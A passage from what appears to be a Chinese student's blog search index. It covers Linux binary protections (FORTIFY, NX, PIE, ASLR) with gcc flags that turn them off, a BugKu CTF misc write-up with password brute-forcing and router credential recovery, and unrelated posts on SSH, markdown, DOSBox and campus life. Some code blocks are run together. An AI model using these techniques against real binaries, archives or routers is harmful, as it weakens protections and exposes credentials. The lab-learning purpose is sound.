&#x2F;&#x2F;启用堆栈保护，为所有函数插入保护代码\n\nFORTIFY(轻微的检查)fority其实是非常轻微的检查，用于检查是否存在缓冲区溢出的错误。适用情形是程序采用大量的字符串或者内存操作函数，如memepy,stpcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf， vsprintf，vsnprintf, gets以及宽字符的变体。FORTIFY_ SOURCE设为1,并且将编译器设置为优化1(gcc -01)，以及出现上述情形，那么程序编译时就会进行检查但又不会改变程序功能。\n1234gcc -o test test.c &#x2F;&#x2F; 默认情况下，不会开这个检查 gcc -D_FORTIFY_SOURCE&#x3D;1 -o test test.c &#x2F;&#x2F; 较弱的检查 gcc -D_FORTIFY_SOURCE&#x3D;1 仅仅只会在编译时进⾏检查 (特别像某些头⽂件 #include &lt;str _FORTIFY_SOURCE设为1，并且将编译器设置为优化1(gcc -O1)，以及出现上述情形，那么程序编 gcc -D_FORTIFY_SOURCE&#x3D;2 -o test test.c &#x2F;&#x2F; 较强的检查 gcc -D_FORTIFY_SOURCE&#x3D;2 程序执⾏时也会有检查 (如果检查到缓冲区溢出，就终⽌程序) _FORTIFY_SOURCE设为2，有些检查功能会加⼊，但是这可能导致程序崩溃。\n\n\n\nNX（DEP）NX（ DEP）的基本原理是将数据所在内存⻚标识为不可执⾏,当程序溢出成功转⼊shellcode时，程序会尝试在数据⻚⾯上执⾏指令，此时CPU就会抛出异常 ,⽽不是去执⾏恶意指令 。 \n123gcc -o test test.c &#x2F;&#x2F; 默认情况下，开启NX保护gcc -z execstack -o test test.c &#x2F;&#x2F; 禁⽤NX保护 gcc -z noexecstack -o test test.c &#x2F;&#x2F; 开启NX保护\n\n在Windows下，类似的概念为DEP（数据执行保护）,数据执⾏保护( D E P ) （ Data Execution Prevention ） 是⼀套软硬件技术，能 够 在 内 存上执⾏额外检查以帮助防⽌在系统上运⾏恶意代码 ,在最新版的Visual Studio中默认开启了DEP编译选项。\nPIE（ASLR）可以防范基于Ret2libc方式的针对DEP的攻击。ASLR和DEP配合使用，能有效阻止攻击者在堆栈上运行恶意代码。PIE和ASLR不是一样的作用，ASLR只能对堆、栈,ibc和mmap随机化，而不能对代码段，数据段随机化，使用PIE+ASLR则可以对代码段和数据段随机化。区别是ASLR是系统功能选项，PIE和PIC是编译器功能选项。联系点在于在开启ASLR之后，PIE才会生效。\n12345gcc -o test test.c &#x2F;&#x2F; 默认情况下，不开启PIE gcc -fpie -pie -o test test.c &#x2F;&#x2F; 开启PIE，此时强度为1 gcc -fPIE -pie -o test test.c &#x2F;&#x2F; 开启PIE，此时为最⾼强度2 gcc -fpic -o test test.c &#x2F;&#x2F; 开启PIC，此时强度为1，不会开启PIEgcc -fPIC -o test test.c &#x2F;&#x2F; 开启PIC，此时为最⾼强度2，不会开启PIE\n\n\n\nASLR (Address Space Layout Randomization)ASLR是⼀种针对缓冲区溢出的安全保护技术,通过对堆栈 、共享库映射等线性区布局的随机化，通过增加攻击者预测⽬的地址的难度,防⽌攻击者直接定位攻击代码位置,达到阻⽌溢出攻击的⽬的。 \n参考文章：https://yunnigu.dropsec.xyz/2016/10/08/checksec%E5%8F%8A%E5%85%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/\n","slug":"linux程序的常⽤保护机制","date":"2021-04-09T13:14:59.000Z","categories_index":"PWN","tags_index":"基础知识","author_index":"Krito"},{"id":"6555700b23ec65c00135060dc244ee5c","title":"SSH连接失败","content":"\n\n\n\n\n\n\n\n\n闲的无聊就整了一下博客，结果出大问题了，之前的备份又删了，所以不得不重建，这次重建花了整整一天，虽说浪费时间但是还是有所收获\n搭建博客视频网上一大堆，这里就不多讲了，这里就讲一下错误和如何解决\nssh: connect to host github.com port 22: Connection timed out这个问题烦了我几个小时，网上的解决方法参差不齐（反正我通过网上的方法没用解决），最后还是看官方的解决方法（还是官方的靠谱）Using SSH over the HTTPS port。\n出现这个问题是因为22端口被占用或者防火墙不允许ssh连接。解决方法是通过通过HTTPS启用SSH连接，命令：ssh -T -p 443 &#x67;&#x69;&#116;&#64;&#x73;&#x73;&#104;&#46;&#x67;&#105;&#x74;&#104;&#x75;&#x62;&#x2e;&#x63;&#111;&#x6d;，运行时输入yes，这样可以强制连接，连接成功后就可以进行下一步操作了（不成功可以看官方给的故障排除指南），成功后，在.ssh文件夹中创建一个config文件（千万千万别加后缀名！）内容如下：\n1234Host github.com  Hostname ssh.github.com  Port 443  User git\n\n最后输入：ssh -T &#x67;&#105;&#x74;&#64;&#x67;&#105;&#x74;&#104;&#117;&#98;&#x2e;&#x63;&#x6f;&#x6d;看是否成功连接\n成功连接如下：\n123$ ssh -T git@github.com&gt; Hi username! You&#39;ve successfully authenticated, but GitHub does not&gt; provide shell access.\n\n简单介绍一下SSH，博客上传时，如果没用通过ssh连接的话，需要输入密码，通过ssh远程连接以后就不需要了\n","slug":"SSH连接失败","date":"2021-03-15T13:29:03.000Z","categories_index":"问题","tags_index":"博客","author_index":"Krito"},{"id":"aeac33b711f776d73f0726b5ddfdbdd8","title":"bugkuMISC","content":"BUGKU misc部分1 这是一张单纯的图片先看了一下属性，发现并没有什么有用的信息，打开就是上面那张图，没有上面异样，\n\n\n直接丢winhex，拖至最底，发现是unicode加密\n\n\n发现是unicode加密，直接解码成ASCII，得到flag\n\n\n\n2 隐写看到题目就知道是图片隐写，对图片进行校验和，发现结果有问题，说明照片高度被修改了\n\n\n修改高度得到flag\n\n\n\n3 telnet下载附件后打开，直接追踪TCP流就得到了flag\n\n\n\n4 眼见非实打开后发现文件是损坏的而且出现了PK字符，猜测里面藏有压缩包，于是改成压缩包形式打开\n\n\n在word里面的document.xml里面发现了flag\n\n\n\n5 啊哒老规矩，打开照片看属性，发现照相机型号有东西，之后应该用得上\n\n\n用binwalk查看，发现里面藏有一个压缩包，用foremost进行分离得到压缩包，打开发现是加密的，尝试了照相机型号，发现密码错误，分析了一下那串照相机型号，发现是十六进制，之后解码得到密码\n\n\n打开得到flag\n\n\n\n6 ping用wireshark打开后发现十六进制旁边一个f，打开其它的发现组合起来是flag\n\n\n\n7 赛博朋克打开后发现就一个光秃秃的加密文件，不用猜都知道是伪加密，丢进winhex修改一下就可以打开了\n\n\n打开文件后发现是一堆乱码，丢进winhex发现是png格式照片\n\n\n修改一下后缀名图片就出来了，不过好像flag还没出来，属性里面也没什么东西，校验和也正确，binwalk也没查出问题\n\n\n\n\n最后推测一个是lsb隐写，果不其然，得到flag\n\n\n\n8 贝斯手打开介绍发现是对图片上人物介绍，刚想关闭发现最下面还有东西，发现密码是四位数和这个贝斯手有关\n\n\n懒得搜直接暴力破解\n\n\n打开后发现是一串加密字符，5+58应该加密方式MD5和base58\n\n\n解码得到flag\n\n\n\n\n\n9 又一张图片，还单纯吗打开属性发现没有有用的信息，丢进winhex里面也没发现什么，用binwalk查看发现照片里面有其它jpg照片，用forem分离\n\n\n发现图片里面有flag（不过这个flag有点长，有点离谱）\n\n\n\n10 猜签到题，百度识图，发现是刘亦菲，得到flag（注意flag格式）\n\n11 宽带信息泄露下载RouterPassView，用这个搜索username（用户名）\n\n\n\n12 隐写2直接丢进winhex，发现jpg图片结尾后面有压缩包的字符\n\n\n用foremost分离得到一个加密的文件和密码提示，解密（直接爆破，反正是三位数）得到一张图片\n\n\n老规矩丢winhex，发现最后有flag\n\n\n\n13 多种方法解决这道题提示说有二维码，打开附件发现是一个exe可执行文件（尝试打开发现无法运行），直接丢winhex\n\n\n发现是旁边是加密的图片编码，直接在线解码得到flag\n\n\n\n14 闪的好快emmmm，这道题挺简单的就是好烦，用Stegsolve.jar一帧一帧看，扫码，flag就出来了\n\n15 come_game打开后是个游戏，每次死亡都会多个文件，找到save1将它丢尽winhex里面，将2AC改成5AC在进游戏就可以得到flag，当然如果觉得能闯过去也应该能得到flag。（我没试过，不确定能不能行，提醒一下这个游戏打开了好像不能关闭）\n\n\n\n16 白哥的鸽子直接丢进winhex里面，发现照片结尾后面多出一些字符，分析一下就知道是栅栏加密\n\n\n解密（密匙我是一个一个试的，不过还好就是3，后面才知道那个提示“咕咕咕”好像就代表key=3）\n\n\n17 linux看到题目就知道要用Linux系统\n","slug":"bugku-MISC","date":"2021-02-02T13:24:11.000Z","categories_index":"MISC","tags_index":"wp","author_index":"Krito"},{"id":"ea7bb1240e1dab8cf5209f8a8c9f1924","title":"快乐周五","content":"\n\n\n\n\n\n\n\n\n这是这几个月最值得纪念的周五，体验了脱离学校的快乐\n2020.12.13\n  晚上和社团其它人一起谋划着“出校大计”，原本定在周六，但是由于学校要体测（挺佩服学校挑时间的能力🤬），不得不将时间改成周五，让快乐减少了一半😔\n2020.12.15\n  果然到了周末就会发现屁事很多😔，一个个周末都有事，只剩几个大男人可以出去，这次出校也变成了“罗汉出行”，照这样下去，不知道之后几天会发生什么😱\n2020.12.17\n  原本课上得好好的，突然一个朋友说周六体测取消了，改了时间，我直接当场爆炸🤬，没办法假条都上交了，时间也不能修改，只能认命\n2020.12.18\n  原本计划好的五个人，要走的时候最后一个人掉链子😔，最后变成四罗汉出行。\n开始打算看电影，但是觉得没什么好看的电影加上时间不够，所以改成了密室逃脱（补充一下，有个当地人带路非常重要😃）\n\n\n\n\n\n\n游戏体验还不错（除了那个怕鬼的师兄），还送了一个纪念品（下面的是买奶茶送的纪念品）😃\n\n\n最后去吃了碗拉面，味道还是相当不错的，就是价格有点小贵/(ㄒoㄒ)/~~\n饭后去逛了一下，带点东西给室友，最后打的回校\n\n\n  这次行程还是不错的（比呆在学校好多了），发现南昌还是蛮好玩的，但就是不知道下次出去是什么时候了😔\n","slug":"tuoli","date":"2020-12-19T02:48:28.000Z","categories_index":"生活","tags_index":"娱乐","author_index":"Krito"},{"id":"53611955a6f979c71a5255210a5666f4","title":"markdown语法","content":"\n\n\n\n\n\n\n\n\n搭建好博客后没有直接开始写文章是因为写文章时遇到了很多问题，之后去b站和百度上了解了一下，学到了一些关于markdown语法的使用方法，在此分享一下\n标题“#”一级标题\n“##”二级标题\n……（共六级标题，“#”后面要空一格）\n效果如图\n\n\n\n\n引用&lt;一级引用\n&lt;&lt;二级引用\n&lt;&lt;&lt;三级引用\n……(可不断嵌套）\n效果如图\n\n\n字体斜体要加粗的文字左右分别用两个*号包起来\n加粗要加粗的文字左右分别用两个*号包起来\n斜体加粗要倾斜和加粗的文字左右分别用三个*号包起来\n删除线要加删除线的文字左右分别用两个~号包起来\n1234**这是加粗的文字***这是倾斜的文字*&#96;***这是斜体加粗的文字***~~这是加删除线的文字~~\n\n字体与颜色12345678&lt;font face&#x3D;&quot;黑体&quot;&gt;我是黑体字&lt;&#x2F;font&gt;&lt;font face&#x3D;&quot;微软雅黑&quot;&gt;我是微软雅黑&lt;&#x2F;font&gt;&lt;font face&#x3D;&quot;STCAIYUN&quot;&gt;我是华文彩云&lt;&#x2F;font&gt;&lt;font color&#x3D;red&gt;我是红色&lt;&#x2F;font&gt;&lt;font color&#x3D;#008000&gt;我是绿色&lt;&#x2F;font&gt;&lt;font color&#x3D;Blue&gt;我是蓝色&lt;&#x2F;font&gt;&lt;font size&#x3D;5&gt;我是尺寸&lt;&#x2F;font&gt;&lt;font face&#x3D;&quot;黑体&quot; color&#x3D;green size&#x3D;5&gt;我是黑体，绿色，尺寸为5&lt;&#x2F;font&gt;\n\n\n\n分割线可用三个或三个以上“ - ”或者“ _ ”生成分割线（两个个效果都一样)\n隐藏内容(隐藏内容不会直接显示在博客主页，需要点进去看)\n1在&lt;!--more--&gt;输入的文章内容不会直接显示在博客页面\n\n\n\n\n\n图片引用链接引用在src=后面加入照片地址，width指照片宽度，height指照片高度\n例如\n1&lt;img src=&quot;http://pic11.photophoto.cn/20090626/0036036341009653_b.jpg&quot; width=&quot;251&quot; height=&quot;350&quot; &gt;\n\n本地引用与链接引用类似，不过需要将网址改为路径（如果在相同目录里面，只需要将填写对应文件夹即可）\n1&lt;img src&#x3D;&quot;&#x2F;images&#x2F;1.jpg&quot; height&#x3D;&quot;400&quot; width&#x3D;&quot;350&quot; &#x2F;&gt;\n\n\n\n\n\n照片居中1&lt;div align&#x3D;right&gt;&lt;img src&#x3D;&quot;http:&#x2F;&#x2F;pic11.photophoto.cn&#x2F;20090626&#x2F;0036036341009653_b.jpg&quot; width&#x3D;&quot;50%&quot; height&#x3D;&quot;50%&quot;&gt;&lt;&#x2F;div&gt;\n\n\n\n\n\n超链接12[超链接名](超链接地址 &quot;超链接title&quot;)title可加可不加\n\n\n\n\n\n列表无序列表12345- 列表内容+ 列表内容* 列表内容注意：- + * 跟内容之间都要有一个空格\n\n三个效果都一样\n有序列表数字加点\n列表嵌套上一级和下一级之间敲三个空格即可\n例如\n\n一级无序列表内容\n\n二级无序列表内容\n\n\n二级无序列表内容\n二级无序列表内容\n\n\n一级无序列表内容\n\n二级有序列表内容\n二级有序列表内容\n二级有序列表内容\n\n\n\n\n一级有序列表内容\n二级无序列表内容\n二级无序列表内容\n二级无序列表内容\n\n\n一级有序列表内容\n二级有序列表内容\n二级有序列表内容\n二级有序列表内容\n\n\n\n视频引用与照片引用类似\n12&lt;video src&#x3D;&#39;&#x2F;视频路径&#x2F;选择视频&#39; heigth&#x3D;&#39;高度&#39; controls&gt;例如：&lt;video src&#x3D;&#39;&#x2F;video&#x2F;1.mp4&#39; heigth&#x3D;&#39;500px&#39; controls&gt;\n\n\n\n\n\n","slug":"markdown","date":"2020-12-07T12:33:55.000Z","categories_index":"笔记","tags_index":"学习","author_index":"Krito"},{"id":"ebab8c4f399bfb20ac63ab99ee74d493","title":"debug安装与配置","content":"win64位系统进入debug\n\n\n\n\n\n\n\n\n最近一直在看汇编语言，想要实操，于是要进入debug模式，但是发现win64位系统无法直接进入，但最后经过几次尝试终于成功进入\n安装1、首先要下载安装DOSBox，也就是下面这个东西\n\n\n安装地址：链接：https://pan.baidu.com/s/1B0dzSc--Ok_ds67ai4flmQ     提取码：a7tp \n2、因为软件比较小，为了避免麻烦，我直接默认安装在C:\\Program Files (x86)中\n3、找到 debug.exe，并把你喜欢的位置上，记住目录（等会用到）这里我放在D:\\Debug目录下\n配置打开DOSBox.exe，输入以下指令\n123mount c d:\\debugc:debug\n\n\n\n之后就进入了debug模式\n调试如果嫌每次进入都需要输入很麻烦，可以在DOSBox 0.74 Options.bat的脚本文件进行修改，步骤如下：\n1、找到DOSBox 0.74 Options.bat，双击点开\n2、点开后拉至最底下输入\n12mount c d:\\debugc:\n\n3、保存退出\n\n\n注意开 DOSBox 会同时打开两个窗口，其中一个是黑色的控制台窗口，在控制台窗口中指明了配置文件的绝对路径\n","slug":"debug安装与配置","date":"2020-12-06T12:33:40.000Z","categories_index":"笔记","tags_index":"学习","author_index":"Krito"},{"id":"ce9156f0e3c852946bbfbbd9e0a335db","title":"我的第一篇文章","content":"新的开始这是本人第一次搭博客，走了许多弯路，经过了无数次的失败，浪费了大量的时间，但最终还是搭建完成。在这其中，我请教了石师兄和高师兄，借鉴了B站的视频，才最终成功。最后，我希望迈出这一小步后能够继续向前，并成为我想成为的人。\n\n\n音频测试照片\n\n音乐\n\n视频\n\n\n","slug":"My-First-Post","date":"2020-11-21T07:48:03.000Z","categories_index":"心得","tags_index":"感想","author_index":"Krito"}]